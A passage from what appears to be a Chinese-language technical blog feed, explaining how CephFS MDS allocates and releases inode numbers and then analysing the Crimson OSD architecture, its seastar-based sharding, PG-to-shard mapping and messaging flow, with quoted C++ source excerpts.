<span class="hljs-comment">// 检查inode号的当前状态并移除</span><br>    <span class="hljs-keyword">if</span> (delegated_inos.<span class="hljs-built_in">contains</span>(ino)) &#123;<br>      delegated_inos.<span class="hljs-built_in">erase</span>(ino);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (free_prealloc_inos.<span class="hljs-built_in">contains</span>(ino)) &#123;<br>      free_prealloc_inos.<span class="hljs-built_in">erase</span>(ino);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">ceph_assert</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 自动分配模式</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!free_prealloc_inos.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-comment">// 取第一个空闲inode号</span><br>    ino = free_prealloc_inos.<span class="hljs-built_in">range_start</span>();<br>    free_prealloc_inos.<span class="hljs-built_in">erase</span>(ino);<br>  &#125;<br>  <span class="hljs-keyword">return</span> ino;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-1、Inode-编号补充机制"><a href="#2-1-1、Inode-编号补充机制" class="headerlink" title="2.1.1、Inode 编号补充机制"></a>2.1.1、Inode 编号补充机制</h3><p>当 Session(会话) 中的可用 inode 数量小于 <code>mds_client_prealloc_inos</code> 的一半时，则会从全局 inotable 中申请 inode 来扩容会话的可用 inode 数量到达 <code>mds_client_prealloc_inos</code> ，但是在实际扩容的时候是先将申请的 inode 放置到 <code>mdr-&gt;prealloc_inos</code> 中，等待该请求处理完成后才会调用 <code>Server::apply_allocated_inos</code> 函数将新申请的 inode 赋值给 <code>session-&gt;free_prealloc_inos</code> 和 <code>session-&gt;info.prealloc_inos</code>。</p><p><strong>可能的原因如下:</strong></p><ul><li>如果请求失败，MDR 中的预分配 inode 可以安全丢弃，而不会污染 Session 的预分配池;</li><li>多个并发请求可能同时需要预分配 inode ，通过 MDR 隔离可以避免竞争条件;</li><li>预分配机制将 inode 分配压力分散到不同时间点，而不是集中在文件创建时;</li></ul><p><strong>顾虑解答:</strong></p><ul><li>问题: 由于 Session 的 Inode 扩容是依赖于 mgr 请求结束后，那么是否会存在多个并发请求同时检测到会话中可用的 inode 不够，同时申请，进而导致会话的 inode 超过 <code>mds_client_prealloc_inos</code> 配置的情况？</li><li>答案：不会出现，由于在每次扩容的时候都会将新申请的 inode 计入 <code>pending_prealloc_inos</code> 中，并且在判断当前会话的可用 inode 时调用的 <code>get_num_projected_prealloc_inos</code> 函数内部也会统计上 <code>pending_prealloc_inos</code> 的值，所以不会出现会话的 inode 超过配置参数的情况。</li></ul><h2 id="2-2、从全局-Inode-编号表中申请"><a href="#2-2、从全局-Inode-编号表中申请" class="headerlink" title="2.2、从全局 Inode 编号表中申请"></a>2.2、从全局 Inode 编号表中申请</h2><p><strong>执行流程:</strong></p><ul><li>当 <code>take_ino()</code> 返回 0 (预分配池为空或无效) 时，执行全局分配;</li><li>调用 project_alloc_id() 函数从全局 inotable 表中分配新的 inode 号;</li></ul><p><strong>相关函数:</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 从全局 Inode 表中分配代码</span><br><span class="hljs-keyword">else</span> &#123;<br>  mdr-&gt;alloc_ino = _inode-&gt;ino = mds-&gt;inotable-&gt;<span class="hljs-built_in">project_alloc_id</span>(_useino);<br>  <span class="hljs-keyword">if</span> (mdcache-&gt;<span class="hljs-built_in">test_and_clear_taken_inos</span>(_inode-&gt;ino)) &#123;<br>    mds-&gt;inotable-&gt;<span class="hljs-built_in">apply_alloc_id</span>(_inode-&gt;ino);<br>    _inode-&gt;ino = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">dout</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;prepare_new_inode alloc &quot;</span> &lt;&lt; mdr-&gt;alloc_ino &lt;&lt; <span class="hljs-string">&quot; but has been taken, will try again!&quot;</span> &lt;&lt; dendl;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">dout</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;prepare_new_inode alloc &quot;</span> &lt;&lt; mdr-&gt;alloc_ino &lt;&lt; dendl;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">inodeno_t</span> <span class="hljs-title">InoTable::project_alloc_id</span><span class="hljs-params">(<span class="hljs-type">inodeno_t</span> id)</span> </span>&#123;<br>  <span class="hljs-built_in">dout</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;project_alloc_id &quot;</span> &lt;&lt; id &lt;&lt; <span class="hljs-string">&quot; to &quot;</span> &lt;&lt; projected_free &lt;&lt; <span class="hljs-string">&quot;/&quot;</span> &lt;&lt; free &lt;&lt; dendl;<br>  <span class="hljs-built_in">ceph_assert</span>(<span class="hljs-built_in">is_active</span>());<br>  <span class="hljs-keyword">if</span> (!id)<br>    id = projected_free.<span class="hljs-built_in">range_start</span>();<br>  projected_free.<span class="hljs-built_in">erase</span>(id);<br>  ++projected_version;<br>  <span class="hljs-keyword">return</span> id;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MDSRank</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>  InoTable *inotable = <span class="hljs-literal">nullptr</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InoTable</span> : <span class="hljs-keyword">public</span> MDSTable &#123;<br><span class="hljs-keyword">private</span>:<br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; free;<br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; projected_free;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三、Inode-编号释放逻辑"><a href="#三、Inode-编号释放逻辑" class="headerlink" title="三、Inode 编号释放逻辑"></a>三、Inode 编号释放逻辑</h1><p>目前没有观察到将 inode 释放给 session 的情况，因此这里仅介绍释放到全局 Inode 表的情况，后续有新的发现后会继续补充。</p><h2 id="3-1、释放给全局-Inode-编号表"><a href="#3-1、释放给全局-Inode-编号表" class="headerlink" title="3.1、释放给全局 Inode 编号表"></a>3.1、释放给全局 Inode 编号表</h2><p>当会话关闭后，完成 MDLog 的持久化操作之后，会调用对应的 <code>C_MDS_session_finish::finish</code> 函数将会话中的 <code>pending_prealloc_inos</code> 和 <code>free_prealloc_inos</code> 中的 inode 归还给全局的 inode 表。</p><p><strong><code>InoTable::project_release_ids</code> 函数的相关调用链路如下:</strong></p><pre><code class="hljs mermaid">graph TD    %% 定义样式    classDef outerNode fill:#e1f5fe,stroke:#01579b,stroke-width:1px    classDef innerNode fill:#fff3e0,stroke:#e65100,stroke-width:1px    classDef finalNode fill:#e8f5e8,stroke:#2e7d32,stroke-width:1px    %% 最外层节点（调用链的起点）    S_handle_open[&quot;Server::handle_client_session&quot;]    S_close_forced[&quot;Server::close_forced_opened_sessions&quot;]    S_terminate[&quot;Server::terminate_sessions&quot;]    S_kill[&quot;Server::kill_session&quot;]    MDS_recovery[&quot;MDSRank::recovery_done&quot;]    class S_handle_open,S_close_forced,S_terminate,S_kill,MDS_recovery outerNode    %% 中间节点    S_journal_close[&quot;Server::journal_close_session&quot;]    C_finish[&quot;C_MDS_session_finish::finish&quot;]    S_session_logged[&quot;Server::_session_logged&quot;]    M_start_purge[&quot;MDCache::start_purge_inodes&quot;]    M_purge[&quot;MDCache::purge_inodes&quot;]    class S_journal_close,C_finish,S_session_logged,M_start_purge,M_purge innerNode    %% 最终节点    I_project[&quot;InoTable::project_release_ids&quot;]    class I_project finalNode    %% 构建调用关系，核心路径在中间    %% 左侧分支：直接调用 journal_close_session    S_close_forced --&gt; S_journal_close    S_terminate --&gt; S_journal_close    S_kill --&gt; S_journal_close    %% 右侧分支：从 recovery_done 开始的路径    MDS_recovery --&gt; M_start_purge    M_start_purge --&gt; M_purge    %% 中心主干：从 handle_client_session 开始    S_handle_open -- &quot;CEPH_SESSION_REQUEST_CLOSE&quot; --&gt; S_journal_close    S_journal_close --&gt; C_finish    C_finish --&gt; S_session_logged    S_session_logged --&gt; M_purge    M_purge --&gt; I_project    %% 中心主干的另一条输入路径（开放会话）    S_handle_open -- &quot;CEPH_SESSION_REQUEST_OPEN&quot; --&gt; C_finish</code></pre><p><strong>相关代码:</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InoTable::project_release_ids</span><span class="hljs-params">(<span class="hljs-type">const</span> interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; &amp;ids)</span> </span>&#123;<br>  <span class="hljs-built_in">dout</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;project_release_ids &quot;</span> &lt;&lt; ids &lt;&lt; <span class="hljs-string">&quot; to &quot;</span> &lt;&lt; projected_free &lt;&lt; <span class="hljs-string">&quot;/&quot;</span> &lt;&lt; free &lt;&lt; dendl;<br>  projected_free.<span class="hljs-built_in">insert</span>(ids);<br>  ++projected_version;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InoTable</span> : <span class="hljs-keyword">public</span> MDSTable &#123;<br><span class="hljs-keyword">private</span>:<br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; free;<br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; projected_free;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、参考资料"><a href="#四、参考资料" class="headerlink" title="四、参考资料"></a>四、参考资料</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/101040392">cephfs中inode号的分配</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph Crimson 设计实现深入解析</title>
      <link href="/2025/06/01/ceph-cirmson/"/>
      <url>/2025/06/01/ceph-cirmson/</url>
      
        <content type="html"><![CDATA[<p>Crimson 是 Crimson OSD 的代码名称，它是下一代用于多核心可扩展性的 OSD 。它通过快速网络和存储设备提高性能，采用包括 DPDK 和 SPDK 的顶级技术。BlueStore 继续支持 HDD 和 SSD。Crimson 旨在与早期版本的 OSD 守护进程与类 Ceph OSD 兼容。</p><p>Crimson 基于 SeaStar C++ 框架构建，是核心 Ceph 对象存储守护进程 OSD 组件的新实现，并替换了 Ceph OSD 。Crimson OSD 最小化延迟并增加 CPU 处理器用量。它使用高性能异步 IO 和新的线程架构，旨在最小化上下文切换和用于跨通信的操作间的线程通信。</p><p><strong>以下分析基于 v19.2.1 进行分析。</strong></p><h1 id="一、架构对比"><a href="#一、架构对比" class="headerlink" title="一、架构对比"></a>一、架构对比</h1><p>Ceph OSD 是 Ceph 集群的一部分，负责通过网络提供对象访问、维护冗余和高可用性，并将对象持久化到本地存储设备。作为 Classic OSD 的重写版本，Crimson OSD 从客户端和其他 OSD 的角度兼容现有的 RADOS 协议，提供相同的接口和功能。Ceph OSD 的模块（例如 Messenger、OSD 服务和 ObjectStore）在其职责上保持不变，但跨组件交互的形式和内部资源管理经过了大幅重构，以应用无共享设计和自下而上的用户空间任务调度。</p><p>经典 OSD 的架构对多核处理器并不友好，因为每个组件都包含工作线程池，并且每个组件之间共享队列。举个简单的例子，一个 PG 操作首先需要由一个 Messenger 工作线程处理，将原始数据流组装或解码成一条消息，然后放入消息队列进行调度。之后， PG 工作线程获取该消息，经过必要的处理后，将请求以事务的形式交给 ObjectStore 。事务提交后， PG 将完成操作，并通过发送队列和 Messenger 工作线程再次发送回复。虽然可以通过向池中添加更多线程将工作负载扩展到多个 CPU ，但这些线程默认共享资源，因此需要使用锁，从而引入争用。实际情况会更加复杂，因为每个组件内部都会实现更多的线程池，并且如果跨 OSD 进行复制，数据路径也会更长。</p><p><img src="/assets/images/ceph-crimson-old-arch.png" alt="经典 OSD 架构" loading="lazy"></p><p>经典架构面临的一个主要挑战是，锁争用开销会随着任务和核心数量的增加而迅速增长，并且每个锁定点在某些情况下都可能成为扩展瓶颈。此外，即使在无争用的情况下，这些锁和队列也会产生延迟成本。多年来，人们在分析和优化更细粒度的资源管理和快速路径实现以跳过排队方面付出了巨大的努力。未来唾手可得的成果将会减少，在类似的设计下，可扩展性似乎正在收敛到某个乘数。此外，还存在其他挑战。由于簿记工作会在工作线程之间委派任务，延迟问题将随着线程池和任务队列的出现而恶化。锁可能会强制上下文切换，这会使情况更加糟糕。</p><p>Crimson 项目希望通过无共享设计和运行至完成模型来解决 CPU 的可扩展性问题。该设计的基本原理是强制每个核心（或 CPU）运行一个固定线程，并在用户空间中调度非阻塞任务。请求及其资源按核心进行分片，因此它们可以在同一核心中处理直至完成。理想情况下，所有锁和上下文切换都不再需要，因为每个正在运行的非阻塞任务都拥有 CPU，直到其完成或协同让出。没有其他线程可以同时抢占该任务。如果无需与数据路径中的其他分片通信，则理想的性能将随着核心数量线性扩展，直到 IO 设备达到其极限。这种设计非常适合 Ceph OSD，因为在 OSD 级别，所有 IO 都已按 PG 分片。</p><p><img src="/assets/images/ceph-crimson-new-arch.png" alt="Crimson OSD 架构" loading="lazy"></p><h1 id="二、配置解析流程"><a href="#二、配置解析流程" class="headerlink" title="二、配置解析流程"></a>二、配置解析流程</h1><p>配置解析的代码位于 <code>src/crimson/osd/main.cc</code> 文件中的 <code>auto early_config_result = crimson::osd::get_early_config(argc, argv);</code> 函数，该函数主要逻辑如下:</p><ul><li>创建一个子进程，在子进程中尝试解析参数后，将参数编码后通过管道传递给父进程；</li><li>父进程解析并返回参数给 main 函数中；</li></ul><p>子进程在 <code>_get_early_config</code> 函数中解析参数，其中 ceph 相关的参数使用 <code>ceph_argparse_early_args</code> 函数解析，并且根据 ceph 的 <code>crimson_seastar_cpu_cores</code> 参数来设置 <code>--cpuset $cpu_cores --thread-affinity 1</code> ；或者根据 ceph 的 <code>crimson_seastar_num_threads</code> 参数来设置 <code>--smp $smp --thread-affinity 0</code>。注意 <code>crimson_seastar_cpu_cores</code> 参数的优先级高于 <code>crimson_seastar_num_threads</code> 参数。</p><p>之后 <code>main</code> 函数中通过 <code>app.run</code> 函数调用，将解析到的参数传递给 <code>seastar</code> ，进而设置了 <code>seastar</code> 要启动的 <code>shard</code> 的数量及绑定 <code>cpu</code> 的配置。但是由于目前 <code>main</code> 中的 <code>seastar::async</code> 函数逻辑中没有显示的使用 <code>seastar::smp::count</code> 来将任务分发给多个 <code>shard</code> 执行，因此关于日志的配置，<code>prometheus</code> 的配置，<code>crimson osd</code> 的对象均是在 <code>shard 0</code> （即 <code>PRIMARY_CORE</code> ）上执行的。</p><h1 id="三、网络通信流程"><a href="#三、网络通信流程" class="headerlink" title="三、网络通信流程"></a>三、网络通信流程</h1><p>在 crimson osd 进程启动的时候，会调用 <code>OSD::start()</code> 函数，其内部会对 <code>public_msgr</code> 和 <code>cluster_msgr</code> 两个对象执行 <code>bind</code> 和 <code>start</code> 操作。</p><ul><li><code>bind 操作</code>: 对应的函数为 <code>SocketMessenger::bind</code> ， 该函数内部最终通过调用 seastar 的 <code>invoke_on_all</code> 下发 <code>seastar::listen(s_addr, lo)</code> 操作给所有 <code>shard</code> ，使所有的 <code>shard</code> 开始监听相同的端口；</li><li><code>start 操作</code>: 对应的函数为 <code>SocketMessenger::start</code> ， 该函数内部通过调用 <code>ShardedServerSocket::accept</code> ，并在其内部调用 seastar 的 <code>invoke_on_all</code> 方法使每个 shard 接收新连接请求。每个 <code>shard</code> 接收到请求后，会逐步调用 <code>SocketMessenger::accept</code> &#x3D;&gt; <code>SocketConnection::start_accept</code> &#x3D;&gt; <code>ProtocolV2::start_accept</code> &#x3D;&gt; <code>ProtocolV2::execute_accepting</code> 等函数逐步处理请求，最终会调用到 <code>OSD::do_ms_dispatch</code> 函数正式处理客户端请求。</li></ul><p>在 <code>OSD::do_ms_dispatch</code> 函数内部，针对于请求消息的类型，有如下操作：</p><ul><li><code>必须在 PRIMARY_CORE shard 上执行的操作</code>: 包括 <code>CEPH_MSG_OSD_MAP</code>、<code>MSG_COMMAND</code>、<code>MSG_OSD_MARK_ME_DOWN</code> 等；</li><li><code>其他可以在任意 shard 上执行的操作</code>：包括 <code>CEPH_MSG_OSD_MAP</code>、<code>CEPH_MSG_OSD_OP</code>、<code>MSG_COMMAND</code> 等；</li></ul><p><img src="/assets/images/ceph-crimson-osd-pg-shard.png" alt="Shards In OSD" loading="lazy"></p><ul><li>由于 <code>OSD</code> 中的每个 <code>Shard</code> 都会监听网络信息，所以每个 <code>Shard</code> 都可以处理网络请求；</li><li>但是由于需要对请求按照 <code>PG</code> 映射到 <code>Shard</code> 中，所以内部引入了 <code>pg_to_shard_mapping</code> 的映射结构，每个请求都需要在 <code>Shard</code> 中检索映射表；</li><li>如果当前 <code>Shard</code> 中的映射表中缺少 <code>PG</code> 的映射信息，会将请求发送给 <code>Shard 0</code> 来尝试创建对应的映射记录，并将该记录广播给所有的 <code>Shard</code> ；</li></ul><p><strong>对于请求类型为 <code>CEPH_MSG_OSD_OP</code> 的关键代码链路如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 处理对应的 op 请求</span><br>seastar::<span class="hljs-built_in">future</span>&lt;&gt; OSD::handle_osd_op(crimson::net::ConnectionRef conn, Ref&lt;MOSDOp&gt; m)<br>&#123;<br>    <span class="hljs-keyword">return</span> pg_shard_manager.start_pg_operation&lt;ClientRequest&gt;(get_shard_services(), conn, <span class="hljs-built_in">std</span>::move(m)).second;<br>&#125;<br><br><span class="hljs-comment">// 开始 pg 操作</span><br>template&lt;typename T, typename... Args&gt; <span class="hljs-keyword">auto</span> <span class="hljs-title function_">start_pg_operation</span><span class="hljs-params">(Args&amp;&amp;... args)</span><br>&#123;<br>......<br><br>    <span class="hljs-keyword">auto</span> fut =<br>        opref.template enter_stage&lt;&gt;(opref.get_connection_pipeline().await_active)<br><br>            ......<br><br>            <span class="hljs-comment">// 从 pg_to_shard_mapping 中获取 pg 与 shard 的对应关系，</span><br>            <span class="hljs-comment">// 如果对应的映射关系不存在，则根据各 shard 的负载情况创建映射关系。</span><br>            .then([this, &amp;opref] &#123; <span class="hljs-keyword">return</span> get_pg_to_shard_mapping().get_or_create_pg_mapping(opref.get_pgid()); &#125;)<br>            .then_wrapped([this, &amp;logger, op = <span class="hljs-built_in">std</span>::move(op)](<span class="hljs-keyword">auto</span> fut) mutable &#123;<br><br>                ......<br><br>                <span class="hljs-keyword">auto</span> core = fut.get();<br>                logger.debug(<span class="hljs-string">&quot;&#123;&#125;: can_create=&#123;&#125;, target-core=&#123;&#125;&quot;</span>, *op, T::can_create(), core);<br>                <span class="hljs-comment">// 处理已知 shard id 的 op 请求</span><br>                <span class="hljs-keyword">return</span> this-&gt;template with_remote_shard_state_and_op&lt;T&gt;(<br>                    core, <span class="hljs-built_in">std</span>::move(op), [this](ShardServices&amp; target_shard_services, typename T::IRef op) &#123;<br>                        <span class="hljs-keyword">auto</span>&amp; opref = *op;<br>                        <span class="hljs-keyword">auto</span>&amp; logger = crimson::get_logger(ceph_subsys_osd);<br>                        logger.debug(<span class="hljs-string">&quot;&#123;&#125;: entering create_or_wait_pg&quot;</span>, opref);<br>                        <span class="hljs-keyword">return</span> opref<br>                            .template enter_stage&lt;&gt;(<br>                                opref.get_pershard_pipeline(target_shard_services).create_or_wait_pg)<br>                            .then([this, &amp;target_shard_services, op = <span class="hljs-built_in">std</span>::move(op)]() mutable &#123;<br>                                <span class="hljs-keyword">if</span> <span class="hljs-type">constexpr</span> (T::can_create()) &#123;<br>                                    <span class="hljs-keyword">return</span> this-&gt;template run_with_pg_maybe_create&lt;T&gt;(<span class="hljs-built_in">std</span>::move(op),<br>                                                                                        target_shard_services);<br>                                &#125;<br>                                <span class="hljs-keyword">else</span> &#123;<br>                                    <span class="hljs-keyword">return</span> this-&gt;template run_with_pg_maybe_wait&lt;T&gt;(<span class="hljs-built_in">std</span>::move(op),<br>                                                                                    target_shard_services);<br>                                &#125;<br>                            &#125;);<br>                    &#125;);<br>            &#125;);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">make_pair</span>(id, <span class="hljs-built_in">std</span>::move(fut));<br>&#125;<br><br><span class="hljs-comment">// 获取或创建 pg 和 shard 的映射关系</span><br>seastar::<span class="hljs-built_in">future</span>&lt;<span class="hljs-type">core_id_t</span>&gt; <span class="hljs-title function_">PGShardMapping::get_or_create_pg_mapping</span><span class="hljs-params">(<span class="hljs-type">spg_t</span> pgid, <span class="hljs-type">core_id_t</span> core_expected)</span><br>&#123;<br>    LOG_PREFIX(PGShardMapping::get_or_create_pg_mapping);<br>    <span class="hljs-keyword">auto</span> find_iter = pg_to_core.find(pgid);<br>    <span class="hljs-keyword">if</span> (find_iter != pg_to_core.end()) &#123;<br>        <span class="hljs-keyword">auto</span> core_found = find_iter-&gt;second;<br>        <span class="hljs-comment">// 一些校验逻辑</span><br>        assert(core_found != NULL_CORE);<br>        <span class="hljs-keyword">if</span> (core_expected != NULL_CORE &amp;&amp; core_expected != core_found) &#123;<br>            ERROR(<span class="hljs-string">&quot;the mapping is inconsistent for pg &#123;&#125;: core &#123;&#125;, expected &#123;&#125;&quot;</span>, pgid, core_found, core_expected);<br>            ceph_abort(<span class="hljs-string">&quot;The pg mapping is inconsistent!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> seastar::make_ready_future&lt;<span class="hljs-type">core_id_t</span>&gt;(core_found);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        DEBUG(<span class="hljs-string">&quot;calling primary to add mapping for pg &#123;&#125; to the expected core &#123;&#125;&quot;</span>, pgid, core_expected);<br>        <span class="hljs-comment">// 如果没有找到 pg 和 shard 的映射关系，则需要创建映射，</span><br>        <span class="hljs-comment">// 创建操作必须由 shard 0 执行。</span><br>        <span class="hljs-keyword">return</span> container()<br>            .invoke_on(<br>                <span class="hljs-number">0</span>,<br>                [pgid, core_expected, FNAME](<span class="hljs-keyword">auto</span>&amp; primary_mapping) &#123;<br>                    <span class="hljs-keyword">auto</span> core_to_update = core_expected;<br>                    <span class="hljs-comment">// 在 shard 0 中判断对应的映射关系是否存在，</span><br>                    <span class="hljs-comment">// 如果存在且校验正常则可使用该映射关系</span><br>                    <span class="hljs-keyword">auto</span> find_iter = primary_mapping.pg_to_core.find(pgid);<br>                    <span class="hljs-keyword">if</span> (find_iter != primary_mapping.pg_to_core.end()) &#123;<br><br>                        ......<br><br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-comment">// 如果在 shard 0 中也没有找到映射关系，则创建映射</span><br>                        ceph_assert_always(primary_mapping.core_to_num_pgs.size() &gt; <span class="hljs-number">0</span>);<br>                        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-type">core_id_t</span>, <span class="hljs-type">unsigned</span>&gt;::iterator count_iter;<br>                        <span class="hljs-keyword">if</span> (core_expected == NULL_CORE) &#123;<br>                            <span class="hljs-comment">// 从 shard 中选择 pg 映射数量最少的最为当前 pg 的关联 shard</span><br>                            count_iter = <span class="hljs-built_in">std</span>::min_element(<br>                                primary_mapping.core_to_num_pgs.begin(),<br>                                primary_mapping.core_to_num_pgs.end(),<br>                                [](<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; left, <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; right) &#123; <span class="hljs-keyword">return</span> left.second &lt; right.second; &#125;);<br>                            core_to_update = count_iter-&gt;first;<br>                        &#125;<br><br>                        ......<br>                    &#125;<br>                    assert(core_to_update != NULL_CORE);<br><br>                    <span class="hljs-comment">// 广播同步</span><br>                    <span class="hljs-comment">// 通过 invoke_on_others 确保所有 Core 的映射表同步更新</span><br>                    <span class="hljs-comment">// 将变更的映射关系广播给其他所有的 shard</span><br>                    <span class="hljs-keyword">return</span> primary_mapping.container().invoke_on_others(<br>                        [pgid, core_to_update, FNAME](<span class="hljs-keyword">auto</span>&amp; other_mapping) &#123;<br><br>                            ......<br>                        &#125;);<br>                &#125;)<br><br>                ......<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 处理 op 请求</span><br>template&lt;typename T, typename F&gt; <span class="hljs-keyword">auto</span> with_remote_shard_state_and_op(<span class="hljs-type">core_id_t</span> core, typename T::IRef&amp;&amp; op, F&amp;&amp; f)<br>&#123;<br>    ceph_assert(op-&gt;use_count() == <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 如果 op 请求的目标 shard 为当前 shard ，则在当前 shard 中处理</span><br>    <span class="hljs-keyword">if</span> (seastar::this_shard_id() == core) &#123;<br>        <span class="hljs-keyword">auto</span> f_conn = op-&gt;prepare_remote_submission();<br>        op-&gt;finish_remote_submission(<span class="hljs-built_in">std</span>::move(f_conn));<br>        <span class="hljs-keyword">auto</span>&amp; target_shard_services = shard_services.local();<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::invoke(<span class="hljs-built_in">std</span>::move(f), target_shard_services, <span class="hljs-built_in">std</span>::move(op));<br>    &#125;<br><br>    ......<br><br>    <span class="hljs-comment">// 否则，将对应的 op 请求转发给对应的 shard 处理</span><br>    logger.debug(<span class="hljs-string">&quot;&#123;&#125;: send &#123;&#125; to the remote pg core &#123;&#125;&quot;</span>, opref, cc_seq, core);<br>    <span class="hljs-keyword">return</span> opref.get_handle().complete().then([this, core, cc_seq, op = <span class="hljs-built_in">std</span>::move(op), f = <span class="hljs-built_in">std</span>::move(f)]() mutable &#123;<br>        get_local_state().registry.remove_from_registry(*op);<br>        <span class="hljs-keyword">auto</span> f_conn = op-&gt;prepare_remote_submission();<br>        <span class="hljs-keyword">return</span> shard_services.invoke_on(<br>            core,<br>            [this, cc_seq, f = <span class="hljs-built_in">std</span>::move(f), op = <span class="hljs-built_in">std</span>::move(op), f_conn = <span class="hljs-built_in">std</span>::move(f_conn)](<br>                <span class="hljs-keyword">auto</span>&amp; target_shard_services) mutable &#123;<br>                op-&gt;finish_remote_submission(<span class="hljs-built_in">std</span>::move(f_conn));<br>                target_shard_services.local_state.registry.add_to_registry(*op);<br>                <span class="hljs-keyword">return</span> this-&gt;template process_ordered_op_remotely&lt;T&gt;(<br>                    cc_seq, target_shard_services, <span class="hljs-built_in">std</span>::move(op), <span class="hljs-built_in">std</span>::move(f));<br>            &#125;);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、线程模型"><a href="#四、线程模型" class="headerlink" title="四、线程模型"></a>四、线程模型</h1><p>在服务启动时会通过解析 <code>crimson_seastar_cpu_cores</code> 或 <code>crimson_seastar_num_threads</code> 这两个配置来设置 <code>seastar</code> 框架的并发 <code>shard</code> 数量，之后在 <code>PRIMARY_CORE</code> 初始化环境，并通过 <code>seastar</code> 的 <code>invoke_on</code>、<code>invoke_on_others</code>、<code>invoke_on_all</code>、<code>seastar::smp::submit_to</code> 等方法来给 <code>shard</code> 下发任务，从而实现 <code>osd</code> 中相互独立的 <code>shard</code> 任务模型。</p><h2 id="4-1、shard-相关任务"><a href="#4-1、shard-相关任务" class="headerlink" title="4.1、shard 相关任务"></a>4.1、shard 相关任务</h2><p><strong>seastar 提供的不同的下发任务的方法比较:</strong></p><table><thead><tr><th align="center">接口</th><th align="center">目标 Shard</th><th align="center">是否依赖 <code>sharded</code> 容器</th><th align="center">典型用途</th></tr></thead><tbody><tr><td align="center"><code>invoke_on</code></td><td align="center">指定单个 Shard</td><td align="center">是</td><td align="center">访问特定 Shard 上的对象</td></tr><tr><td align="center"><code>invoke_on_others</code></td><td align="center">除当前 Shard 外的所有</td><td align="center">是</td><td align="center">广播操作（排除当前 Shard）</td></tr><tr><td align="center"><code>invoke_on_all</code></td><td align="center">所有 Shard（包括当前）</td><td align="center">是</td><td align="center">全局初始化&#x2F;清理</td></tr><tr><td align="center"><code>smp::submit_to</code></td><td align="center">指定单个 Shard</td><td align="center">否</td><td align="center">任意跨 Shard 任务</td></tr></tbody></table><p><strong><code>invoke_on</code> 的部分操作如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 更新配置值并通知所有观察者</span><br>container().invoke_on(...)<br><br><span class="hljs-comment">// 在 0 号 shard 上停止 shards</span><br>this-&gt;container().invoke_on(<span class="hljs-number">0</span>, [](<span class="hljs-keyword">auto</span>&amp; ss) &#123; ... &#125;)<br><br><span class="hljs-comment">// 在 0 号 shard 上新增 pg 和 shard 的映射关系</span><br>container().invoke_on(<span class="hljs-number">0</span>, [pgid, core_expected, FNAME](<span class="hljs-keyword">auto</span>&amp;<br><br><span class="hljs-comment">// 在 0 号 shard 上移除 pg 和 shard 的映射关系</span><br>container().invoke_on(<span class="hljs-number">0</span>, [pgid, FNAME](<span class="hljs-keyword">auto</span>&amp; primary_mapping) &#123; ... &#125;)<br><br><span class="hljs-comment">// 转发请求给特定 shard</span><br>shard_services.invoke_on(core, ... )<br></code></pre></td></tr></table></figure><p><strong><code>invoke_on_others</code> 的部分操作如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 更新 proxy 配置</span><br>container().invoke_on_others(...)<br><br><span class="hljs-comment">// 广播 pg shard 新增映射记录</span><br>primary_mapping.container().invoke_on_others(...)<br><br><span class="hljs-comment">// 广播 pg shard 移除映射记录</span><br>primary_mapping.container().invoke_on_others(...)<br></code></pre></td></tr></table></figure><p><strong><code>invoke_on_all</code> 的部分操作如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs 